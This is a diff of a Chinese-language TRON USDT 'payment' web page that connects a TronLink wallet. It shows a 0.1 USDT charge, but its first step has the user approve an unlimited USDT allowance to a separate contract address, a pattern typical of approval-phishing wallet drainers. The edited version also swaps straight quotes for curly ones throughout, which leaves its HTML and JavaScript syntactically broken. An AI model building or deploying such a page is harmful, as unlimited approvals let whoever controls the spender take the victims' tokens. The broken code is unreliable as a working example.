@@ -1,294 +1,383 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang=”zh-CN“>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>USDT 收款</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
-<style>
-body {
-  font-family: Arial, sans-serif;
-  background: #f4f6f9;
-  margin: 0;
-  padding: 25px;
-  text-align: center;
-}
-.container {
-  max-width: 420px;
-  margin: 30px auto;
-  padding: 25px;
-  background: white;
-  border-radius: 16px;
-}
-button {
-  width: 100%;
-  padding: 14px;
-  margin-top: 12px;
-  border: 0;
-  border-radius: 9px;
-  background: #1677ff;
-  color: white;
-  font-size: 16px;
-}
-button:disabled { opacity: .5; }
-.address {
-  font-size: 12px;
-  word-break: break-all;
-  background: #f1f3f5;
-  padding: 10px;
-  border-radius: 8px;
-}
-#qrcode {
-  display: flex;
-  justify-content: center;
-  margin: 20px;
-}
-#status {
-  margin-top: 15px;
-  font-size: 13px;
-  word-break: break-all;
-}
-</style>
+  <meta charset=”UTF-8“>
+  <meta name=”viewport“ content=”width=device-width,initial-scale=1“>
+  <title>USDT 收款</title>
+
+  <script src=”https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js“></script>
+  <script src=”https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js“></script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f9;
+      margin: 0;
+      padding: 25px;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 30px auto;
+      padding: 25px;
+      background: white;
+      border-radius: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 12px;
+      border: 0;
+      border-radius: 9px;
+      background: #1677ff;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      opacity: .5;
+      cursor: not-allowed;
+    }
+
+    .address {
+      font-size: 12px;
+      word-break: break-all;
+      background: #f1f3f5;
+      padding: 10px;
+      border-radius: 8px;
+    }
+
+    #qrcode {
+      display: flex;
+      justify-content: center;
+      margin: 20px;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 13px;
+      word-break: break-all;
+    }
+  </style>
 </head>
 
 <body>
-<div class="container">
-  <h2>USDT 收款</h2>
-  <h1 id="amountTitle">0.1 USDT</h1>
+  <div class=”container“>
+    <h2>USDT 收款</h2>
+    <h1 id=”amountTitle“>0.1 USDT</h1>
 
-  <div id="qrcode"></div>
-  <p>扫码打开本收款页面</p>
+    <div id=”qrcode“></div>
+    <p>扫码打开本收款页面</p>
 
-  <button onclick="connectWallet()">连接钱包</button>
+    <button onclick=”connectWallet()“>连接钱包</button>
 
-  <p>当前钱包</p>
-  <div class="address" id="wallet">尚未连接</div>
+    <p>当前钱包</p>
+    <div class=”address“ id=”wallet“>尚未连接</div>
 
-  <p>收款地址</p>
-  <div class="address" id="recipient"></div>
+    <p>收款地址</p>
+    <div class=”address“ id=”recipient“></div>
 
-  <button id="approveBtn" onclick="approveUSDT()" disabled>
-    Step 1: Approve USDT (Unlimited)
-  </button>
+    <button id=”approveBtn“ onclick=”approveUSDT()“ disabled>
+      Step 1: Approve USDT (Unlimited)
+    </button>
 
-  <button id="transferBtn" onclick="transferUSDT()" disabled>
-    第二步：转账 0.1 USDT
-  </button>
+    <button id=”transferBtn“ onclick=”transferUSDT()“ disabled>
+      第二步：转账 0.1 USDT
+    </button>
 
-  <div id="status">请先连接钱包</div>
-</div>
+    <div id=”status“>请先连接钱包</div>
+  </div>
 
-<script>
-// ===== 页面配置 =====
-const CONFIG = {
-  USDT_CONTRACT:
-    "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+  <script>
+    const CONFIG = {
+      USDT_CONTRACT:
+        ”TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t“,
 
-  RECIPIENT:
-    "THiSMwRKuoQw1aHPxCSk9NJbLp55jC4o5b",
+      RECIPIENT:
+        ”THiSMwRKuoQw1aHPxCSk9NJbLp55jC4o5b“,
 
-  // ⚠️ 必须改成真实的 T 开头地址
-  BUSINESS_CONTRACT:
-    "ABCD",
+      BUSINESS_CONTRACT:
+        ”ABCD“,
 
-  // 转账金额 0.1 USDT（6 位精度）
-  AMOUNT:
-    "100000",
+      AMOUNT:
+        ”100000“,
 
-  // 无限授权额度：uint256 最大值（十进制）
-  INFINITE_APPROVE:
-    "115792089237316195423570985008687907853269984665640564039457584007913129639935",
+      INFINITE_APPROVE:
+        ”115792089237316195423570985008687907853269984665640564039457584007913129639935“,
 
-  // 手续费上限，单位 sun（1 TRX = 1,000,000 sun）
-  FEE_LIMIT:
-    100000000
-};
+      FEE_LIMIT:
+        100000000,
 
-let tronWeb = null;
-let userAddress = null;
+      PAGE_URL:
+        ”https://con374.github.io/usdt-payment-page/“
+    };
 
-const $ = id => document.getElementById(id);
+    let tronWeb = null;
+    let userAddress = null;
 
-function setStatus(message) {
-  $("status").textContent = message;
-}
+    const $ = id => document.getElementById(id);
 
-const amountText = (Number(CONFIG.AMOUNT) / 1e6).toString();
-$("amountTitle").textContent = amountText + " USDT";
-$("recipient").textContent = CONFIG.RECIPIENT;
-$("transferBtn").textContent = "第二步：转账 " + amountText + " USDT";
-
-// 二维码内容是当前网页 URL
-if (location.protocol === "https:" || location.protocol === "http:") {
-  new QRCode($("qrcode"), {
-    text: location.href,
-    width: 180,
-    height: 180
-  });
-} else {
-  $("qrcode").textContent = "请将网页部署到 HTTPS 网站后生成二维码";
-}
-
-// 连接 TronLink
-async function connectWallet() {
-  try {
-    if (!window.tronLink) {
-      throw new Error("请先安装 TronLink 钱包");
+    function setStatus(message) {
+      $(”status“).textContent = message;
     }
 
-    const result = await window.tronLink.request({
-      method: "tron_requestAccounts"
-    });
+    const amountText = (Number(CONFIG.AMOUNT) / 1e6).toString();
 
-    if (!result || result.code !== 200) {
-      throw new Error("钱包连接未获批准");
+    $(”amountTitle“).textContent = amountText + ” USDT“;
+    $(”recipient“).textContent = CONFIG.RECIPIENT;
+    $(”transferBtn“).textContent =
+      ”第二步：转账 “ + amountText + ” USDT“;
+
+    if (window.QRCode) {
+      $(”qrcode“).innerHTML = ”“;
+
+      new QRCode($(”qrcode“), {
+        text: CONFIG.PAGE_URL,
+        width: 180,
+        height: 180,
+        correctLevel: QRCode.CorrectLevel.H
+      });
+    } else {
+      $(”qrcode“).textContent =
+        ”二维码库加载失败，请检查网络“;
     }
 
-    tronWeb = window.tronWeb;
+    async function connectWallet() {
+      try {
+        if (!window.tronLink) {
+          throw new Error(”请先安装 TronLink 钱包“);
+        }
 
-    if (!tronWeb || !tronWeb.ready) {
-      throw new Error("请在 TronLink 浏览器中打开网页");
+        const result = await window.tronLink.request({
+          method: ”tron_requestAccounts“
+        });
+
+        if (!result || result.code !== 200) {
+          throw new Error(”钱包连接未获批准“);
+        }
+
+        tronWeb = window.tronWeb;
+
+        if (!tronWeb || !tronWeb.ready) {
+          throw new Error(”请在 TronLink 浏览器中打开网页“);
+        }
+
+        const net = await tronWeb.network();
+
+        if (!net || net.name !== ”mainnet“) {
+          throw new Error(”请切换到 TRON 主网“);
+        }
+
+        userAddress = tronWeb.defaultAddress.base58;
+
+        if (!userAddress) {
+          throw new Error(”未获得钱包地址“);
+        }
+
+        $(”wallet“).textContent = userAddress;
+        $(”approveBtn“).disabled = false;
+        $(”transferBtn“).disabled = false;
+
+        setStatus(”钱包连接成功“);
+      } catch (e) {
+        setStatus(”连接失败：“ + (e.message || String(e)));
+      }
+    }
+    async function waitForConfirmation(txid) {
+      setStatus(”交易已提交，正在等待确认……“);
+
+      for (let i = 0; i < 20; i++) {
+        await new Promise(resolve =>
+          setTimeout(resolve, 3000)
+        );
+
+        try {
+          const info = await tronWeb.trx.getTransactionInfo(txid);
+
+          if (info && info.id) {
+            if (
+              info.receipt &&
+              info.receipt.result === ”SUCCESS“
+            ) {
+              setStatus(”交易已确认：“ + txid);
+            } else {
+              const result =
+                info.receipt
+                  ? info.receipt.result
+                  : ”UNKNOWN“;
+
+              setStatus(
+                ”交易已确认，结果：“ +
+                result +
+                ”，txid：“ +
+                txid
+              );
+            }
+
+            return;
+          }
+        } catch (e) {
+          // Continue waiting
+        }
+      }
+
+      setStatus(
+        ”交易已提交，但确认超时。请在区块浏览器查询：“ +
+        txid
+      );
     }
 
-    const net = await tronWeb.network();
-    if (net.name !== "mainnet") {
-      throw new Error("请切换到 TRON 主网");
-    }
+    async function approveUSDT() {
+      try {
+        if (!tronWeb || !userAddress) {
+          throw new Error(”请先连接钱包“);
+        }
 
-    userAddress = tronWeb.defaultAddress.base58;
-
-    $("wallet").textContent = userAddress;
-    $("approveBtn").disabled = false;
-    $("transferBtn").disabled = false;
-    setStatus("钱包连接成功");
-  } catch (e) {
-    setStatus("连接失败：" + (e.message || String(e)));
-  }
-}
-
-// 等待交易上链确认（英文提示）
-async function waitForConfirmation(txid) {
-  setStatus("Transaction submitted. Waiting for confirmation...");
-  for (let i = 0; i < 20; i++) {
-    await new Promise(r => setTimeout(r, 3000));
-    try {
-      const info = await tronWeb.trx.getTransactionInfo(txid);
-      if (info && info.id) {
-        if (info.receipt && info.receipt.result === "SUCCESS") {
-          setStatus("Transaction confirmed: " + txid);
-        } else {
-          const result = info.receipt ? info.receipt.result : "UNKNOWN";
-          setStatus(
-"Transaction confirmed with result: " +
-            result + ", txid: " + txid
+        if (!tronWeb.isAddress(CONFIG.BUSINESS_CONTRACT)) {
+          throw new Error(
+            ”BUSINESS_CONTRACT 不是有效的 TRON 地址“
           );
         }
-        return;
-      }
-    } catch (e) {
-      // keep waiting
-    }
-  }
-  setStatus(
-    "Transaction submitted, but confirmation timed out. " +
-    "Check on Tronscan: " + txid
-  );
-}
 
-// Step 1: Unlimited approval（全英文）
-async function approveUSDT() {
-  try {
-    if (!tronWeb || !userAddress) {
-      throw new Error("Please connect your wallet first");
-    }
+        const confirmed = confirm(
+          ”You are about to authorize USDT. “ +
+          ”Please review the spender address and allowance “ +
+          ”in your wallet. Continue?“
+        );
 
-    if (!tronWeb.isAddress(CONFIG.BUSINESS_CONTRACT)) {
-      throw new Error("BUSINESS_CONTRACT is not a valid TRON address");
-    }
+        if (!confirmed) {
+          return;
+        }
 
-    const confirmed = confirm(
-      "You are about to authorize USDT. " +
-      "Please review the spender address and allowance in your wallet. Continue?"
-    );
-    if (!confirmed) return;
+        $(”approveBtn“).disabled = true;
+        setStatus(
+          ”请在钱包中确认授权……“
+        );
 
-    $("approveBtn").disabled = true;
-    setStatus("Please confirm the authorization in your wallet...");
+        const token =
+          await tronWeb.contract().at(
+            CONFIG.USDT_CONTRACT
+          );
 
-    const token = await tronWeb.contract().at(CONFIG.USDT_CONTRACT);
+        const tx = await token.approve(
+          CONFIG.BUSINESS_CONTRACT,
+          CONFIG.INFINITE_APPROVE
+        ).send({
+          feeLimit: CONFIG.FEE_LIMIT
+        });
 
-    const tx = await token.approve(
-      CONFIG.BUSINESS_CONTRACT,
-      CONFIG.INFINITE_APPROVE
-    ).send({ feeLimit: CONFIG.FEE_LIMIT });
+        let txid;
 
-    const txid = typeof tx === "string"
-      ? tx
-      : (tx.transaction && tx.transaction.txID) || String(tx);
+        if (typeof tx === ”string“) {
+          txid = tx;
+        } else if (tx && tx.txid) {
+          txid = tx.txid;
+        } else if (
+          tx &&
+          tx.transaction &&
+          tx.transaction.txID
+        ) {
+          txid = tx.transaction.txID;
+        } else {
+          txid = String(tx);
+        }
 
-    await waitForConfirmation(txid);
-  } catch (e) {
-    setStatus("Authorization failed: " + (e.message || String(e)));
-  } finally {
-    $("approveBtn").disabled = false;
-  }
-}
-
-// 第二步：直接转账
-async function transferUSDT() {
-  try {
-    if (!tronWeb || !userAddress) {
-      throw new Error("请先连接钱包");
-    }
-
-    if (!tronWeb.isAddress(CONFIG.RECIPIENT)) {
-      throw new Error("收款地址格式错误");
-    }
-
-    const confirmed = confirm(
-      "即将直接向收款地址转账 " + amountText + " USDT。\n" +
-      "收款地址：" + CONFIG.RECIPIENT + "\n请确认收款地址和金额。"
-    );
-    if (!confirmed) return;
-
-    $("transferBtn").disabled = true;
-    setStatus("请在钱包中确认转账交易...");
-
-    const token = await tronWeb.contract().at(CONFIG.USDT_CONTRACT);
-
-    const tx = await token.transfer(
-      CONFIG.RECIPIENT,
-      CONFIG.AMOUNT
-    ).send({ feeLimit: CONFIG.FEE_LIMIT });
-
-    const txid = typeof tx === "string"
-      ? tx
-      : (tx.transaction && tx.transaction.txID) || String(tx);
-
-    await waitForConfirmation(txid);
-  } catch (e) {
-    setStatus("转账失败：" + (e.message || String(e)));
-  } finally {
-    $("transferBtn").disabled = false;
-  }
-}
-
-// 页面加载时自动检测已连接的钱包
-window.addEventListener("load", () => {
-  setTimeout(() => {
-    if (window.tronWeb && window.tronWeb.ready) {
-      tronWeb = window.tronWeb;
-      userAddress = tronWeb.defaultAddress.base58;
-      if (userAddress) {
-        $("wallet").textContent = userAddress;
-        $("approveBtn").disabled = false;
-        $("transferBtn").disabled = false;
-        setStatus("已检测到已连接的钱包");
+        await waitForConfirmation(txid);
+      } catch (e) {
+        setStatus(
+          ”授权失败：“ +
+          (e.message || String(e))
+        );
+      } finally {
+        $(”approveBtn“).disabled = false;
       }
     }
-  }, 1000);
-});
-</script>
+
+    async function transferUSDT() {
+      try {
+        if (!tronWeb || !userAddress) {
+          throw new Error(”请先连接钱包“);
+        }
+
+        if (!tronWeb.isAddress(CONFIG.RECIPIENT)) {
+          throw new Error(”收款地址格式错误“);
+        }
+
+        const confirmed = confirm(
+          ”即将直接向收款地址转账 “ +
+          amountText +
+          ” USDT。\n收款地址：“ +
+          CONFIG.RECIPIENT +
+          ”\n请确认收款地址和金额。“
+        );
+
+        if (!confirmed) {
+          return;
+        }
+
+        $(”transferBtn“).disabled = true;
+        setStatus(”请在钱包中确认转账交易……“);
+
+        const token =
+          await tronWeb.contract().at(
+            CONFIG.USDT_CONTRACT
+          );
+
+        const tx = await token.transfer(
+          CONFIG.RECIPIENT,
+          CONFIG.AMOUNT
+        ).send({
+          feeLimit: CONFIG.FEE_LIMIT
+        });
+
+        let txid;
+
+        if (typeof tx === ”string“) {
+          txid = tx;
+        } else if (tx && tx.txid) {
+          txid = tx.txid;
+        } else if (
+          tx &&
+          tx.transaction &&
+          tx.transaction.txID
+        ) {
+          txid = tx.transaction.txID;
+        } else {
+          txid = String(tx);
+        }
+
+        await waitForConfirmation(txid);
+      } catch (e) {
+        setStatus(
+          ”转账失败：“ +
+          (e.message || String(e))
+        );
+      } finally {
+        $(”transferBtn“).disabled = false;
+      }
+    }
+
+    window.addEventListener(”load“, () => {
+      setTimeout(() => {
+        if (window.tronWeb && window.tronWeb.ready) {
+          tronWeb = window.tronWeb;
+          userAddress =
+            tronWeb.defaultAddress.base58;
+
+          if (userAddress) {
+            $(”wallet“).textContent = userAddress;
+
+            $(”approveBtn“).disabled = false;
+            $(”transferBtn“).disabled = false;
+
+            setStatus(”已检测到已连接的钱包“);
+          }
+        }
+      }, 1000);
+    });
+  </script>
 </body>
 </html>
